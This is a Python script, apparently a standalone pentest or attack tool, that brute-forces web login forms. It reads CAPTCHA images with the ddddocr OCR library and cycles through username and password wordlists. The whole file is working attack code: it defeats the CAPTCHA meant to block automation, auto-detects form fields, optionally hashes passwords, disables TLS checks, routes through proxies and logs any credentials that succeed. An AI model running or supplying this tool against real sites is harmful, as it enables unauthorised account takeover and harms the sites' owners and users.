# -*- coding: utf-8 -*-
'''
Brute-force web login with simple CAPTCHA using ddddocr
Author: ladesiji
'''
import ddddocr
import requests
import time, hashlib, argparse, sys, logging
from itertools import product
from urllib.parse import parse_qsl

# 初始化日志系统，记录日志到文件并同时输出到控制台
log_filename = f"log_{time.strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(log_filename, mode='w', encoding='utf-8'),
        logging.StreamHandler()
    ]
)

# 常见的错误提示关键词和成功提示关键词，用于判断登录是否成功, 可自定义修改
error_list = ['用户名或密码错误', '错误', 'fail', '密码错误', 'error', 'exist','不存在']
success_list  = ['成功登录', 'success']
ocr = ddddocr.DdddOcr()


def is_successful(r):
    """
    判断登录是否成功：
    - 如果响应状态码是 301 或 302，则认为是跳转成功
    - 否则通过error_list 和 success_list 与响应内容中的关键词判断
    """
    if r.status_code == 301 or r.status_code == 302:
        return True
    if any([i in r.text for i in error_list]):
        return False
    if any([i in r.text for i in success_list]):
        return True
    return False


def get_code(session, code_url, max_retry=3):
    """
    获取验证码并识别默认最多尝试3次
    """
    for _ in range(max_retry):
        try:
            res = session.get(code_url, timeout=3, allow_redirects=True)
            if res.status_code == 200:
                code = ocr.classification(res.content).replace('-', "").replace('_', "")
                if code and len(code)>3: return code
        except Exception as e:
            logging.error(f'验证码获取失败: {e}')
        time.sleep(0.5)
    return ""


def file_to_list(file_path):
    with open(file_path, 'r', encoding='utf-8') as f:
        data = f.readlines()
    return [i.strip() for i in data if i.strip()]


def hash_function(s, hash_type=None):
    """
    根据指定哈希类型(md5/sha1/sha512)对密码进行hash处理
    """
    if not hash_type:
        return s
    try:
        h = getattr(hashlib, hash_type)()
        h.update(s.encode())
        return h.hexdigest()
    except AttributeError:
        logging.error(f"[!] 不支持的哈希类型: {hash_type}")
        return s


def attempt_login(session,login_url,post_params):
    try:
        r = session.post(url=login_url,data=post_params,timeout=2,verify=False,allow_redirects=True)
        return r
    except Exception as e: 
        logging.error(e)
        return None  
    

def find_field(possible_keys, post_data_items,default):
    """
    根据常见字段关键字，从 POST 参数中自动识别用户名、密码、验证码字段名
    """
    for key in post_data_items:
        if any(k in key.lower() for k in possible_keys):
            return key
    return default


def main():
    # 解析命令行参数
    parser = argparse.ArgumentParser(description="Brute-force web login with simple CAPTCHA")
    parser.add_argument("login_url", help="login URL")
    parser.add_argument("code_url", help="vcode URL")
    parser.add_argument("-d","--post_data",metavar="", help="post_params, like 'username=admin&password=123456&vcode=1234&submit=submit'",default='username=admin&password=123456&vcode=jydqor&submit=Login')
    parser.add_argument("-u","--user_file",metavar="", help="usename dict file", default='./dict/username.txt')
    parser.add_argument("-p","--pass_file",metavar="", help="password dict file", default='./dict/password.txt')
    parser.add_argument("--header", action="append",metavar="", help="Custom request headers (Key:Value)", default=None)
    parser.add_argument("--hash_type", metavar="",help="password encrypt type, support:md5,sha1,sha512", default=None)
    parser.add_argument("--error_code",metavar="", help="code error message", default='验证码输入错误')
    parser.add_argument("--proxy", metavar="", help="HTTP proxy, like http://127.0.0.1:8080")

    args = parser.parse_args()

    login_url = args.login_url
    code_url = args.code_url
    post_data = dict(parse_qsl(args.post_data))
    user_dict = file_to_list(args.user_file)
    pass_dict = file_to_list(args.pass_file)

    logging.info(f"{time.strftime('%Y%m%d_%H%M%S')}")
    logging.info(f'login_url:{login_url}')
    logging.info(f'code_url:{code_url}')
    logging.info(f'Loaded {len(user_dict)} usernames and {len(pass_dict)} passwords.\n')
    logging.debug(args)

    # 尝试自动识别 POST 数据中的用户名/密码/验证码字段, 识别不成功时可手动修改
    username_key = find_field(['user', 'account', 'uname'], post_data,'username')
    password_key = find_field(['pass', 'pwd'], post_data,'password')
    vcode_key =  find_field(['code', 'vcode', 'captcha'], post_data,'vcode')

    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    if args.header:
        for header in args.header:
            try:
                key, value = header.split(":", 1)
                headers[key.strip()] = value.strip()
            except ValueError:
                logging.error(f"header 格式错误：{header}，应为 Key:Value")
                sys.exit(1)

    session = requests.Session()
    session.verify = False
    logging.debug(f"headers: {headers}")
    session.headers.update(headers)
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }

    for idx, (username, password) in enumerate(product(user_dict, pass_dict), 1):
        code = get_code(session,code_url)
        post_data[username_key] = username
        post_data[password_key] = hash_function(password, args.hash_type)
        post_data[vcode_key] = code
        r = attempt_login(session,login_url,post_data)

        # 如果验证码错误或请求失败，自动重试最多5次
        count = 0
        while ((not r) or (args.error_code and args.error_code in r.text)) and count < 5:
            time.sleep(0.5)
            code = get_code(session,code_url)
            post_data[vcode_key] = code
            r = attempt_login(session,login_url,post_data)
            count += 1
        if r:
            logging.info(f'[{idx}]\tusername: {username:<8}\tpassword: {password:<10}\tresponse_length: {len(r.text)}\tvcode: {code}')
            logging.debug(f'{idx}]\tusername: {username:<8}\tpassword: {password:<10}\tcontent: {r.text}')
        if is_successful(r):
            logging.info(f'登录成功，用户名：{username}，密码：{password}')
            sys.exit(0)
    sys.exit(1)


if __name__ == '__main__':
    main()
